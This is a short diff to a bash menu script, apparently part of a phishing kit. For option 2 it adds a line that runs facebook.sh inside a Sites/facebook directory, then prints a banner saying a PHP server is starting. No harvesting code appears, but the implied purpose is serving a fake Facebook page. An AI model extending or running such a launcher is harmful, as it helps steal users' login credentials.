@@ -86,7 +86,8 @@ echo ""
                   elif [ $option = 02 ] || [ $option = 2 ]
 	          then
 	                   cd Sites/
-                           cd facebook/         
+                           cd facebook/
+                           bash facebook.sh         
                            echo ""
                            echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                            echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
